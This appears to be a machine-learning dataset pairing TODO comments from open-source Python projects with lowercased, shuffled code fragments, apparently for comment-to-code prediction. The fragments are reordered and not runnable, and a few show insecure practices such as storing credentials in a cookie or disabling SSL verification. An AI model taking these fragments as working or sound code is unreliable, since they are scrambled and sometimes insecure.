# todo: may test with codecs.open passing an encoding </s> with open(self.filename) as fobj:	test_import_from_csv_fobj def test_import_from_csv_fobj(self): table = rows.import_from_csv(fobj, encoding=self.encoding) self.assert_expected_table(table)
# todo map relationship backreferences using the django names </s> base.prepare()	get_base metadata.reflect(engine) Base = automap_base(metadata=metadata) set_all_class_defaults(Base) BASE_CLASSES_CACHE[cache_key] = Base
# todo: переделать механизм pairs </s> pair = none	extract abbr = abbr[:-1] starts_properties = [] for alias in css_aliases: if (alias.endswith('...')) and abbr.startswith(alias[:-1]):
# todo(andym): use mock appropriately here. </s> self.old_version = amo.firefox.latest_version	TestUpdateCompatibility def setUp(self): self.url = reverse('devhub.addons') amo.FIREFOX.latest_version = '3.6.15' def tearDown(self):
#@todo: remove in 0.4.10 </s> if reason:	offline def offline(self, reason=""): Fail and indicate file is offline self.pyfile.error = encode(reason) raise Fail("offline")
# todo(henry-nash): we should issue an exception here since if </s> versionutils.report_deprecated_feature(	_normalize_domain_id 'belong to.')) else: LOG,
# todo: unit test for this check </s> if not isinstance(other, rectangle):	__and__ def __and__(self, other):  # type: (Rectangle) -> Rectangle return NotImplemented x1, y1 = max(self.x, other.x), max(self.y, other.y)
# todo(jaypipes): remove once the pci tracker is always created </s> self.rt.pci_tracker = pci_manager.pcidevtracker(mock.sentinel.ctx)	test_claim_with_pci inst_by_uuid, migr_mock, inst_save_mock): self.assertFalse(self.rt.disabled) pci_dev = pci_device.PciDevice.create( None, fake_pci_device.dev_dict)
# todo use location </s> try:	parse_unicode_values_ def parse_unicode_values_(self): location = self.cur_token_location_ unicode_values = self.expect_string_().split(",") unicode_values = [
# todo: take namespace into account, currently doesn't matter since </s> with session_scope() as db_session:	body_for_message @jsonify def body_for_message(self, message_id): message = db_session.query(Message).join(Message.parts) \ .filter(Message.id==message_id).one()
# todo: make the min-max values a setting? </s> queue = gst.element_factory_make('queue')	_setup_audio_sink def _setup_audio_sink(self): audio_sink = gst.Bin('audio-sink') queue.set_property('max-size-buffers', 0) queue.set_property('max-size-bytes', 0)
# todo: remove in 21.08 </s> if cache_audio_dir is not none:	generate_cache_text cache_audio_dir (path): DEPRECATED path to store .wav files cache_text_file (file): file containing the sentences LOG.warning( "the cache_audio_dir argument is deprecated. ensure the directory "
# todo(mattjj,phawkins): improve this implementation </s> proxy = object()	_flatten_axes def _flatten_axes(treedef, axis_tree): dummy = tree_unflatten(treedef, [object()] * treedef.num_leaves) axes = []
# todo -- make sure more stringent and parse each kext in-memory so we only allow whitelist from .text </s> kmods = [(kmod.address, kmod.address + kmod.m('size'), kmod.name) for kmod in lsmod.mac_lsmod(obj_ref._config).calculate() if str(kmod.name) != "com.apple.kpi.unsupported"]	get_kernel_function_addrs import volatility.plugins.mac.lsmod as lsmod kernel_symbol_addresses = obj_ref.profile.get_all_function_addresses() return (kernel_symbol_addresses, kmods)
# todo remove </s> params = call_path[separate_index + 1]	get_additions result += get_iterator_types(iterators) return result if not params.values: pass
# todo(termie): optimize this call at some point and put it into the </s> metadata_ref = token_ref['metadata']	validate_token if belongs_to: assert token_ref['tenant']['id'] == belongs_to roles_ref = [] for role_id in metadata_ref.get('roles', []):
# todo separate msg </s> msg[4].encode('utf-8')  # head pose data; pandas data frame	ProxyPub msg[2],  # timestamp msg[3].encode('utf-8'),  # FACS data; pandas data frame ]) except:
# todo(himkt): remove `nltk` after solving </s> "nltk<3.6.6",	get_extras_require "torchvision==0.11.1+cpu ; sys_platform!='darwin'", "torchaudio==0.10.0", "allennlp>=2.2.0 ; python_version>'3.6'", "botorch>=0.4.0 ; python_version>'3.6'",
# todo(kan-bayashi): documentation and type hint </s> def unconstrained_rational_quadratic_spline(	unconstrained_rational_quadratic_spline inputs, unnormalized_widths,
# todo federate replies also when that is available in federation layer </s> if instance.is_local and not instance.parent:	federate_content_retraction @receiver(post_delete, sender=Content) def federate_content_retraction(instance, **kwargs): try: django_rq.enqueue(send_content_retraction, instance, instance.author_id)
# todo: probably better to work out why they are occurring, but imo the </s> caplog.set_level(logging.warning)	test_sort_best_candidate__has_non_yanked def test_sort_best_candidate__has_non_yanked(self, caplog, monkeypatch): Test unyanked candidate preferred over yanked. candidates = [ make_mock_candidate('1.0'),
# todo test </s> self.unconstrained_effect_repertoire(purview))	effect_info return utils.emd(self.effect_repertoire(mechanism, purview),
# todo: calculate mu-sigma for f1, accuracy, and roc_auc and make it selectable </s> self.test_scores['judgment_metric'] = self.test_scores['mu_sigmas']	train_final_model rank_accuracies=None, mu_sigmas=results['mu_sigma']) else: last_step = self.pipeline.steps[-1]
# todo(solitude): when the migration of data is completed, we </s> pk = client.create_seller_for_pay(addon)	paypal_setup_confirm if request.method == 'POST' and form.is_valid(): if waffle.flag_is_active(request, 'solitude-payments'): client.patch_seller_paypal(pk=pk, data=form.cleaned_data) adp.update(**form.cleaned_data)
# todo: this should take a vector </s> return self._mesigma	MeSigma self._MeSigma = self.mesh.getEdgeInnerProduct(self.curModel.sigma)
# todo(john-wood-w) allow until plugin validation is added. </s> del self.secret_req['mode']	test_should_allow_empty_mode def test_should_allow_empty_mode(self): result = self.validator.validate(self.order_req) self.assertTrue('secret' in result)
# todo col_type.python_type contains the type that </s> if not isinstance(val, _type_map[col_type]):	__init__ " which is not nullable" % (cls.__name__, prp.key)) else: raise TypeError( "%s.__init__() got a '%s' for keyword argument "
# todo: more unittests </s> self.failunlessequal(singleorplural('a', 'b', 123), 'b')	testBasic self.failUnlessEqual(singleOrPlural('a', 'b', 0), 'b')
# todo: check concurrent streams count and maybe wait </s> stream = protocol.processor.create_stream()	Channel + request_bin) protocol = await self._ensure_connected() await stream.send_headers([ (':scheme', 'http'),
pass # todo </s> def handle_request(self, input):	handle_request
# todo: this check is to maintain backwards compatibility with the old way of creating </s> if hasattr(self, 'package_form'):	edit vars = {'data': data, 'errors': errors, 'error_summary': error_summary} self._setup_template_variables(context, {'id': id}, package_type=package_type) c.form = render(self.package_form, extra_vars=vars) else:
# todo: handle url == none </s> elif input in ('b', 'b'): # open link	__handle_input ]) self.main_loop.widget = urwid.Frame(body=urwid.Overlay(linebox, self.content_container, "center", 85, "middle", 23), footer=menu) url = self.__get_selected_link() if url != None:
weights[:,:-3] /= (bm * 3.0) # todo: use exact number of channels. </s> if semantic_weight: weights[:,-3:] /= (bs * semantic_weight)	evaluate for idx, (bp, bm, bs, bh) in self.iterate_batches(patches, norms_m, norms_s, history): weights = bp.astype(np.float32) layer.W.set_value(weights) cur_idx, cur_val, cur_match = self.compute_matches[l](f, history[idx])
# todo: fix broken buildpack / example app </s> self._test_example('example-play', build_timeout=720)	_test_play def _test_play(self):
# todo: currently we are assuming that 'on error resume next' is being </s> log.debug('not setting ' + self.name + ", eval of rhs gave an error.")	Let_Statement self._handle_change_callback(self.name, context) else: else: index = int_convert(eval_arg(self.index, context=context))
# todo: (step 11) gcs directory where kfp outputs are recorded </s> self.test_data_dir = "gs://{}/testdata".format(configs.gcs_bucket_name)	__init__ def __init__(self, **kwargs): super(StubComponentLauncher, self).__init__(**kwargs) self.stubbed_component_ids = ['CsvExampleGen', 'StatisticsGen', 'SchemaGen', 'ExampleValidator',
# todo: make these more configurable </s> host = getattr(settings, "ajax_bridge_host", "localhost")	proxy def proxy(req, path): port = getattr(settings, "AJAX_BRIDGE_PORT", 8001) url = "http://%s:%d/%s?%s" % (host, port, path, req.GET.urlencode())
# todo: namelist, explist </s> self.assertequal(9, p._pos)	testStatLocalAssignment self.assertIsNotNone(node)
# todo care for mro stuff (multiple super classes) </s> super_result = []	_get_defined_names n.parent = s result.append(n) for s in self.base.supers: for cls in follow_statement(s):
return false  # todo: 2.0 return none </s> with _mixer_error_handling(self._mixer):	set_mute validation.check_boolean(mute) if self._mixer is None: result = self._mixer.set_mute(bool(mute)).get() validation.check_instance(result, bool)
# todo: move install_time away from app_setting </s> app_setting(app_instance_name, 'update_time', now)	app_upgrade raise YunohostError(failure_message_with_debug_instructions, raw_msg=True) now = int(time.time()) status['upgraded_at'] = now hook_remove(app_instance_name)
# todo(okuta): check type </s> return _statistics._ndarray_nanmean(	nanmean def nanmean(a, axis=None, dtype=None, out=None, keepdims=False): axis=axis, dtype=dtype, out=out, keepdims=keepdims)
# todo: implement fs_type in dfvfs and remove this implementation </s> fs_info = file_system.getfsinfo()	GetFileSystemTypeFromFileEntry file_system_indicator = file_system.type_indicator if file_system_indicator == definitions.TYPE_INDICATOR_TSK: if fs_info.info: type_string = unicode(fs_info.info.ftype)
# todo: hack </s> if title.lower().find('.torrent') > 0:	create_entries else: raise PluginError('Unknown title_from value %s' % title_from) title = title[:title.lower().find('.torrent')] if title_exists(title):
# todo: allow other formats? </s> im = image.open(album_art.file)	save_album_art im_path = os.path.join(config.image_dir, 'media/%d%%s.%%s' % media.id) try: for size in ['ss', 's', 'm', 'l']: file_path = im_path % (size, 'jpg')
#todo(chris): implement service_catalog </s> self.service_catalog = none	authenticate ["nova"][0]["publicURL"] self.auth_token = body["auth"]["token"]["id"]
#todo: put the numpy.hstack() call in _load_and_unpack class to lazily load </s> dat = _load_and_unpack(h5group[key])	_getitem raise RuntimeError return numpy.zeros(0) return dat
self.setup() # todo: perhaps, remove this to pass path in context </s> current_ids = self.hasher.hash(	fit :param expected_outputs: the expected data output to fit on :return: the pipeline itself current_ids=None, hyperparameters=self.hyperparams,
# todo: logs which are observably relevant should be sent to the client (e.g. the warning of refusing to have more receivers active) </s> logging.basicconfig(level=logging.info)	main def main(argv=sys.argv, _abort_for_test=False): log.startLoggingWithObserver(log.PythonLoggingObserver(loggerName='shinysdr').emit, False) argParser = argparse.ArgumentParser(prog=argv[0])
# todo: change logic to c_leq based on benchmarking </s> except valueerror:	solve_NLP_subproblem fixed_nlp.tmp_duals[c] = c_geq * max( 0, c_geq*(rhs - value(c.body))) for nlp_var, orig_val in zip( MindtPy.variable_list,
# todo: checking the cause of the large deviation </s> mol2 = molecule.from_file(os.path.join(test_dir, "si_cluster_2.xyz"))	HungarianOrderMatcherSiTest self.assertAlmostEqual(rmsd, 0.0, places=6) def test_random_match(self): _, rmsd = self.mm.fit(mol2) self.assertAlmostEqual(rmsd, 1.0177241485450828, places=6)
# todo: implement non-zero js </s> else:	calcFields b = sol e = self.MeSigmaI*self.mesh.edgeCurl.T*self.MfMui*b raise NotImplementedError('solType "%s" is not implemented in CalcFields.' % self.solType) return {'b':b, 'e':e}
logo_url = ''  # todo: add logo url </s> text = build_attachment_text(event) or ''	build_attachment def build_attachment(event): fields = []  # Use build_field event_object_context = event_context.get_event_object_context(
# todo: clean code </s> if local_rb.get_stored_size() == buffer_size - 1:	explorer update_target_variables(policy.critic.weights, critic_weights, tau=1.) update_target_variables(policy.critic_target.weights, critic_target_weights, tau=1.) temp_n_transition = n_transition.value samples = local_rb.sample(local_rb.get_stored_size())
# todo fix. </s> print("{:#x}".format(reil_ctx_out["xmm0"]))	test_punpcklbw x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) print("{:#x}".format(reil_ctx_out["xmm1"]))
# todo: refactor accordingly when v3 websocket api is released </s> output["results"].update({	BittrexAPIOrderBookDataSource if _is_snapshot(msg): output["results"] = _decode_message(msg["R"]) "M": f"{output['results']['M'].split('-')[1]}-{output['results']['M'].split('-')[0]}" })
# todo if update_variable_bounds = false, this will not work as intended. </s> if value(v.ub) < var_ubs[v] - tol:	fbbt_block var_lbs[v] = value(v.lb) if v.ub is not None: improved_vars.add(v) var_ubs[v] = value(v.ub)
# todo: add_messages_to_json? </s> cookie[cookie_id] = dumps(creds)	serve try: authenticate(creds['user'], creds['password']) print 'Content-Type: text/plain' print cookie
# todo: use pybossa uploader! only for debugging: </s> open('/tmp/%d_%s_task_run_json.zip' % (app.id, name), 'wb').write(memzip.getvalue())	export_json memfile.write(str(line)) memzip = make_onefile_memzip(memfile, '%s_task_run.json' % name)
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# todo: remove this method in v2.5 </s> elif self._values['disabled'] in booleans_true:	disabled if self._values['state'] == 'disabled': return True return True elif self._values['disabled'] in BOOLEANS_FALSE:
# todo: get data init to work with tf_function compile #428 </s> model = tf.keras.models.sequential()	test_weightnorm_conv2d def test_weightnorm_conv2d(self): model.add( wrappers.WeightNormalization(
# todo: improve this. </s> self.view.erase_regions('vi_inc_search')	on_change def on_change(self, s): next_hit = self.view.find(s, self.view.sel()[0].b) if next_hit:
@skipif('device-openmp')  # todo: still unsupported with openmp, but soon will be </s> assert np.all(u.data[1] == 72)	test_streaming_two_buffers assert np.all(u.data[0] == 56)
# todo: better to use an inotify method that doesn't conflict with eventlets. </s> while true:	_config_file_stat @kill_on_exception(exc_logname) def _config_file_stat(self): if self.config_file: new_config_file_stats = stat_config_files(
# todo: we also want to use pruned results </s> if param_name in t.params and t.value is trial.state.complete	get_trial_param_result_pairs for t in all_trials
raise  # todo </s> except exception as e:	main raise  # TODO
# security todo - we _should_ be computing sha1(m), but we don't because that's the api. </s> if not self.has_private():	_sign def _sign(self, m, k):   # alias for _decrypt raise error("No private key") if not (1L < k < self.q):
# todo: assert </s> repo = self.remote.get_repo("testrepo0")	test_get_repo Test: Get a repo object
time.sleep(5)  # todo: for some reason, events do not trigger instantly </s> notifications = list(test_folder.get_events(subscription_id, watermark))	test_pull_notifications i1_id = i1.id i1.delete() self.assertEqual(len(notifications), 1) notification = notifications[0]
# todo: check to make sure time points match </s> self.xout = np.array(x)	__init__ self.noutputs = 1 if len(self.yout.shape) < 2 else self.yout.shape[0] self.ninputs = 1 if len(self.yout.shape) < 3 else self.yout.shape[-2] self.nstates = self.xout.shape[0] self.uout = np.array(u)
# todo: make it really async. </s> async def fetch_all(self, credentials, **kwargs):	Servers ServerAzureAdAdministrators, ] api = SqlManagementClient(credentials.credentials, credentials.subscription_id) self['servers'] = {}
# todo: fill these in </s> comp_type = completion_state_e.first	_GetCompletionType comp_words: list of words.  First word is used for dispatching. TODO: what about hash table name? prefix = '' words = []
todo = atomlist # list of atoms we must still mark and explore (recurse on all unmarked neighbors) </s> for atom in todo:	getConnectedAtoms Normally never returns singlets. Optional arg <singlet_ok> permits returning singlets. marked = {} # maps id(atom) -> atom, for processed atoms marked[id(atom)] = atom # since marked means "it's been appended to the todo list" while todo:
# todo: allow setting a placeholder dom element, or any widget parent </s> this.node = document.createelement('button')	_js_init @js def _js_init(self): zoof.get('body').appendChild(this.node); this.node.innerHTML = 'Look, a button!'
return user.address  # todo: update </s> elif item == 'user_country':	get_user_info return user.phone elif item == 'user_city': return user.address  # TODO: update elif item == 'user_address':
# todo: if the procpool has been exhausted this will block. </s> self.procpool.spawn(self.handle_request, body)	on_nova_message def on_nova_message(self, body, message): with self.messagesem: message.ack()
# todo: wrap backend call in error handling. </s> if not backend or backend.playback.stop().get():	stop self._last_position = self.get_time_position() backend = self._get_backend(self.get_current_tl_track()) self.set_state(PlaybackState.STOPPED)
# todo: how to check it? meybe we can omit this test </s> pass	test_uniformfill def test_uniformfill():
# todo: need to cleanup the named argument mess before it is possible. </s> pass	computeNode pass elif star_dict_arg.isExpressionConstantRef(): return CallRegistry.computeCall( self )
# todo sk: select standby db if necessary </s> shard_map = plproxy_config.get_django_shard_map()	_get_doc_database_map consider using `corehq.sql_db.get_db_alias_for_partitioned_doc` instead""" databases = {} part_mask = len(shard_map) - 1 for chunk in chunked(doc_ids, 100):
# todo?: self.assert_eq(kdf.loc['j':'q', 'b':'a'], pdf.loc['j':'q', 'b':'a']) </s> self.assert_eq(kdf.loc[kdf.b > 0, 'b'], pdf.loc[pdf.b > 0, 'b'])	test_loc2d_duplicated_columns self.assert_eq(kdf.loc['j':'q', 'B'], pdf.loc['j':'q', 'B']) self.assert_eq(kdf.loc['j':'q', ['B']], pdf.loc['j':'q', ['B']])
# todo ditto </s> form_type_pattern = '([a-z]+)'	setup domain_code_pattern = '([a-z]+)' form_type_lengths.sort()
# todo(kevinbenton): this test should do something </s> pass	test_quota_enforcement def test_quota_enforcement(self):
# todo remove hardcoded path </s> with bz2.open('c:/users/sofie/documents/data/wikipedia/enwiki-20190320-pages-articles-multistream.xml.bz2', mode='rb') as file:	_read_wikipedia def _read_wikipedia(): line = file.readline() cnt = 1
# todo multi-level import non-breakable </s> if isinstance(par, pr.import) and len(par.namespace) > 1:	_process_new result.append(par) else: no_break_scope = True result.append(par)
# todo(ntamas): there are more possibilities; we could </s> else:	select filtered_idxs = sorted(es.graph.incident(value, mode="in")) func = None values = [e.target for e in es] if op == "in" or op == "notin":
@unittest.skip('not written')  # todo: finish! </s> def test_int(self):	test_int raise NotImplementedError
# todo: check error location </s> assert result.errors[0].message == 'cannot return null for non-nullable type.'	test_nulls_a_sync_returned_object_that_contains_a_non_nullable_field_that_returns_null result = execute(schema, NullingData(), ast, 'Q', {}) assert len(result.errors) == 1 assert result.data == { 'nest': None
# todo: refactor this to be more uniform across sources </s> self.has_ui = false	NDSI_Source def deinit_ui(self): super().deinit_ui() def add_controls_to_menu(self, menu, controls): from pyglui import ui
# todo(wangqun):this method implement will be added after this </s> pass	validate_labels_image_providers def validate_labels_image_providers(mesos_slave_image_providers):
# todo: performance can be improved here by substituting expensive </s> bs = tf.shape(q)[0]	VI_Untied_Block tf.concat(2, [w_l[k], w_fb_l[k-1]]), name="q") q = tf.transpose(q, perm=[0, 3, 1, 2]) rprn = tf.reshape(tf.tile(tf.reshape(tf.range(bs), [-1, 1]), [1, state_batch_size]), [-1]) ins1 = tf.cast(tf.reshape(S1, [-1]), tf.int32)
# todo check if result is in scope -> no evaluation necessary </s> n = dynamic.check_flow_information(flow_scope, name_str,	filter_name print 'b',  flow_scope, name_str, result while flow_scope: position) print
# todo: non-numeric columns should be ignored automatically </s> def test_impl(n):	test_median1 def test_median1(self): df = pd.DataFrame({'A': 2 ** np.arange(n), 'B': np.arange(n) + 1.0}) return df.median()
@jtu.skip_on_devices("tpu")  # todo(phawkins): re-enable </s> def testbeta(self, a, b, dtype):	testBeta for b in [0.2, 5.] for dtype in [onp.float32, onp.float64])) key = random.PRNGKey(0) rand = lambda key, a, b: random.beta(key, a, b, (10000,), dtype)
# todo: has some issues with datetime and sqlite </s> self._test_model('language', post_language_data)	test_language_api def test_language_api(self):
# todo here we could apply a "patch" to the native metadata, if desired </s> meta.append(native_meta)	extract_metadata package=parsers.__package__) native_meta = pmod.get_metadata(ds, ds_identifier) return meta
# todo: if the input was compressed, compress the output? </s> part_file = open(part_path, 'w')	split_one part_dir = get_dir() part_path = os.path.join(part_dir, os.path.basename(input_file)) if clusters_per_file is None: local_clusters_per_file.append(default_clusters)
# todo pseudo code: </s> pass	OpenUri @dbus.service.method(dbus_interface=player_interface) def OpenUri(self, uri):
# todo: extend to other types like datetime? </s> def unique_seq(a):	unique_seq return hpat.utils.to_array(set(A))
#todo: check for continous or discrete, only continuous supported right now </s> dico = 'c'	balred ======= rsys : a reduced order model D,V = np.linalg.eig(sys.A)
# todo: candidate for move to system/hdparm </s> out, err, rc = run_command(	get_disk_power_status :return: single word sting of state as indicated by hdparm -C /dev/<disk> and if we encounter an error line in the output we return unknown. [HDPARM, '-C', '-q', '/dev/disk/by-id/%s' % dev_byid], throw=False) if len(err) != 1:
# todo: how do i make the __iter__ thread safe? </s> objects = []	ordered_iter def ordered_iter(self): assert self._state == OPEN results = self.db.select('SELECT pickle FROM %s' % self.table_name) for r in results:
# todo: lets turn skipifmock into an annotation </s> self.asserttrue(self.cb.exists(self.key).exists)	test_exists self.skipIfMock()
# todo: update consumer </s> return	bind except DuplicateKeyError:
# todo: use self.translate() </s> ghat = np.dot(u.t, g)	gft_windowed C = np.reshape(C, (N, N, Nf), order='F') else: Ftrans = np.sqrt(N) * np.dot(U, (np.kron(np.ones((N)), ghat)*U.T)) C = np.empty((N, N))
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	resume def resume(self, instance, callback):
# todo: when no longer supporting python 2.4 use finally: </s> group = interval.attributes.get( 'group', none )	next raw_size += len( self.current_line ) continue if group and feature_group != group: break
# todo: test jacobian </s> mod = linearfactormodel(data.portfolios, data.factors, risk_free=true)	test_linear_model_parameters_risk_free def test_linear_model_parameters_risk_free(data): res = mod.fit() f = mod.factors.ndarray
# todo: remove verify ssl config when working without it. </s> responses = balearicislands(ses, verify=false).get_all()	fetch_production raise NotImplementedError('This parser is not yet able to parse past dates') ses = session or Session() if not responses: raise ParserException("ES-IB", "No response")
# self.assertnotequal(end, 0) todo </s> cmd = "{systemctl} cat zza.service"	test_4900_unreadable_files_can_be_handled cmd = "{systemctl} show zza.service" out, end = output2(cmd.format(**locals())) out, end = output2(cmd.format(**locals())) self.assertNotEqual(end, 0)
# todo(harlowja): should we be a little more cautious about </s> task_details = wf_details.fetch_tasks(td_name)[0]	task_result_fetcher td_name = task_state_name_functor(task, states.SUCCESS) if td_name in wf_details: if task_details.metadata and 'result' in task_details.metadata: return (True, task_details.metadata['result'])
time.sleep(1)  # delay, for last.fm latency. todo can this be removed later? </s> loved = lastfm_user.get_loved_tracks(limit=1)	test_unlove track.love() track.unlove() if len(loved):  # OK to be empty but if not: self.assertNotEqual(str(loved[0].track.artist), "Test Artist")
# todo parse out args instead of all endpoints </s> endpoints.append(endpoint)	show_state sdnc.get_stored_endpoints() for endpoint in sdnc.endpoints: return endpoints
# todo: move to trim operator </s> bpy.ops.sequencer.gap_remove()	modal bpy.context.scene.frame_current = self.start_frame - 1
# todo: support steps and times (motion blur) </s> luxcore_scene.deleteobject(src_name)	first_run object_ids = array("I", duplis.object_ids) luxcore_scene.DuplicateObject(src_name, dst_name, duplis.get_count(), transformations, object_ids) self._debug_info() return True
# todo - can we support this? </s> self.assertraises(typeerror, entrez.read, handle)	test_text_handle self.assertTrue("DbList" in record) else:
pass  # todo </s> def __cleanup(configuration):	__cleanup
# todo: with git <= 2.3 keep old mechanism: </s> with rm.repo.git.custom_environment(	fetch cnct = ssh_manager.get_connection(fetch_url) cnct.open() GIT_SSH_COMMAND="ssh -S %s" % cnct.ctrl_path): rm.fetch(refspec=refspec, progress=progress)  # TODO: progress +kwargs
# hide numerical axis / todo: adapt for </s> chart.left[0].axis_label_text_color = none	Horizon neg_color=neg_color, xscale=xscale, xgrid=xgrid, ygrid=ygrid, **kws ) chart.left[0].axis_line_color = None chart.left[0].major_label_text_color = None
# todo: documentation pending </s> parameters	save_weights def save_weights(self, filepath, sess=None): ---------- filepath
1  # todo: fill in identifier </s> )	test_automatic_dispute direct_transfer = channel0.create_directtransfer( amount, direct_transfer.sign(privatekey0, address0) channel0.register_transfer(direct_transfer)
# todo: proper java error? </s> raise runtimeerror("could not find method ('%s', '%s') in class %s." % (name, sig, clazz.value.jvm_name))	get_method_id method = clazz.value.find_method(name, sig) if method is None: return method.jvm_id
# todo: remove this monkeypatch once upstream class is fixed. </s> _patch_zone(zone)	_create_record ttl = self.ttl with localzone.manage(self.filename, self.origin, autosave=True) as zone: if zone.add_record(name, rtype, content, ttl=ttl):  # pylint: disable=no-member result = True
# todo: gtk4 - use controllers dragsource and droptarget </s> ...	construct ) else: self.diagram_css = Gtk.CssProvider.new() view.get_style_context().add_provider(
# todo: for now, circumnavigate the detached head issue. </s> for subds in source.get_dataset_handles(recursive=true):	test_publish_submodule def test_publish_submodule(origin, src_path, target_1, target_2): source = install(path=src_path, source=origin, recursive=True) AnnexRepo(opj(src_path, subds), init=True, create=False).git_checkout("master") source_super = source
# todo: supposedly, we can put a <commit /> element in the same post body </s> if commit:	delete if response.status != 200: raise SolrError(self._extract_error(response)) self.commit()
match = util.get_value(rule['match'], kwargs) #todo use subkey? </s> replace = util.get_value(rule['replace'], kwargs) #todo use subkey?	pipe_regex rules = [] for rule in conf['RULE']: replace = re.sub('\$(\d+)', r'\\\1', replace)   #map $1 to \1 etc.   #todo: also need to escape any existing \1 etc. rules.append((rule['field']['value'], match, replace))
# todo: remove the following line after implicit flat src deprecation release </s> meta['orig_flat_src_indices'] = flat_src_inds	_resolve_src_inds all_abs2meta_in[tgt]['has_src_indices'] = True meta = abs2meta_in[tgt] shape = pinfo.root_shape if pinfo.root_shape is not None else parent_src_shape if src_shape is None and shape is not None:
# todo change to check for error when the functionality changes. currently acts as though it doesn't exist </s> url = "/api/v2/nodes/?filter[notafield]=bogus"	test_incorrect_filtering_field def test_incorrect_filtering_field(self): res = self.app.get(url) node_json = res.json['data']
node = ursula.from_metadata_file(filepath=abspath(metadata_path), federated_only=self.federated_only)  # todo: 466 </s> self.known_nodes.add(node)	load_known_nodes for metadata_path in metadata_paths: from nucypher.characters.lawful import Ursula
""" todo: set hyper-parameter </s> return tf.contrib.layers.batch_norm(input, decay=0.9, is_training=is_training)	batch_norm def batch_norm(input, is_training):
# todo: use triple factory </s> model.forward_owa(torch.zeros(16, 3, dtype=torch.long))	test_simple model = SimplE(triples_factory=self.factory) self.assertIsNotNone(model) model.forward_cwa(torch.zeros(16, 2, dtype=torch.long)) model.forward_inverse_cwa(torch.zeros(16, 2, dtype=torch.long))
# todo handle 4 types of transition exceptions </s> pass	create_next pass except Exception: except Exception: pass
pass  # todo </s> def _value_type_none(self):	_value_type_none
# todo: remove things that we don't want botleague agents to be able </s> ret = obz, reward, done, info	inner_step dd_action, is_agent_action=dd_action.has_control) return ret
# todo: batch </s> self._send(rest.request(self._graph_db, "post",	LabelSet def add(self, *labels): if self.__uri__: self.__uri__, list(labels))) self.refresh()
pass  # todo: implement this </s> def show_context_menu(self, point):	show_context_menu
# todo: for backward compatibility only, remove if not used anymore </s> def get_project_id(self):	get_project_id return get_project(key='id')
# todo remove hardcoded path </s> with bz2.open('c:/users/sofie/documents/data/wikipedia/enwiki-20190320-pages-articles-multistream.xml.bz2', mode='rb') as file:	_read_wikipedia_prior_probs ns_regex += "|" + ":?" + ns + ":" ns_regex = re.compile(ns_regex, re.IGNORECASE) line = file.readline() cnt = 0
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: add a value parameter as well </s> super(tag_compound, self).__init__()	TAG_Compound id = TAG_COMPOUND def __init__(self, buffer=None, name=None): self.tags = [] self.name = ""
# todo in python 2.7 or later, this should be a set literal. </s> only |= set(['type', 'id'])	__init__ if only is not None: only = set(get_column_name(column) for column in only) if exclude is not None: exclude = set(get_column_name(column) for column in exclude)
# todo: for now, circumnavigate the detached head issue. </s> for subds in source.get_dataset_handles(recursive=true):	test_publish_recursive def test_publish_recursive(origin, src_path, dst_path, sub1_pub, sub2_pub): source = install(path=src_path, source=origin, recursive=True) AnnexRepo(opj(src_path, subds), init=True, create=False).git_checkout("master") target = GitRepo(dst_path, create=True)
# todo rethink/streamline the clamp_basetype logic </s> if _needs_clamp(right.typ, right.encoding):	make_setter return LLLnode.from_list(["mstore", left, right], typ=None) elif isinstance(left.typ, ByteArrayLike): _val = LLLnode("val", location=right.location, typ=right.typ) copier = make_byte_array_copier(left, _val, pos)
# todo: actually test this once i figure out how to do this in py.test </s> logging.debug("ignoring keyboard interrupt.")	worker ret = create_symlink(job.local_file, job.symlink_path) except KeyboardInterrupt:  # pragma: no cover return ret
# todo: handle count and minp </s> for i in range(0, n):	roll_variable_apply output = np.empty(N, dtype=np.float64) start, end = _build_indexer(on_arr, N, win, False, True) s = start[i] e = end[i]
# @todo: remove this if in 0.6 </s> if isinstance(node_id, node):	ex_create_ip_group def ex_create_ip_group(self, group_name, node_id=None): node_id = node_id.id group_elm = ET.Element(
# todo: disconnect </s> return	Node except asyncio.TimeoutError: await stream.reset() self.logger.debug(f"Received the hello message {hello_other_side}, resp_code={resp_code}.") if not (await self._validate_hello_req(hello_other_side)):
# todo: test! </s> user.email = form.get_email()	email_change_confirm form = EmailCheckForm(data={'email': email, }) if form.is_valid(): user.save() messages.info(request, _("Your email has been changed!"))
#todo: remove this transformation </s> personal_schemas = set([schema.qualified_name for schema in personal_schemas_raw])	add_nonschema_ownerships are skipped as they are managed by ownerships.py as part of the personal schema ownership. personal_schemas_raw = dbcontext.get_all_personal_schemas() all_objects_and_owners = dbcontext.get_all_object_attributes() objects_and_owners = all_objects_and_owners.get(objkind, {})
# todo add verbose output </s> self._domain = new_domain	domain @domain.setter def domain(self, new_domain):
# todo: progress +kwargs </s> else:	pull GIT_SSH_COMMAND="ssh -S %s" % cnct.ctrl_path): remote.pull(refspec=refspec, progress=progress) remote.pull(refspec=refspec, progress=progress)
# todo: 1.1 refactoring </s> raise notimplementederror("requires to be updated to new query builder")	create_cube_aggregate * `aggregates_prefix`: aggregated table prefix * `aggregates_schema`: schema where aggregates are stored if browser.store != self: raise ArgumentError("Can create aggregate table only within "
# todo handle 404 </s> return response(status=status.http_204_no_content)	partial_update else: self.client.minion_reject(pk)
# todo: implement </s> raise notimplementederror()	_handle def _handle(self, key, is_press):
# todo: handle errors better </s> abort(code=http_exceptions.conflict.code, message="could not create a new team.")	post except sqlalchemy.exc.IntegrityError as e: db.session.rollback() return team
# todo some settings in the right column are conditional: bezel corr, maybe diag inches? </s> if true:	create_sizer_settings_right def create_sizer_settings_right(self): self.create_sizer_settings_advanced() self.sizer_setting_paths = wx.StaticBoxSizer(wx.VERTICAL, self, "Wallpaper Paths")
#todo rewrite this part of pdfkit.py </s> css_files = ['fixtures/example.css', 'fixtures/example2.css']	test_multiple_stylesheets_adding_to_the_head def test_multiple_stylesheets_adding_to_the_head(self): r = pdfkit.PDFKit('<html><head></head><body>Hai!</body></html>', 'string', css=css_files)
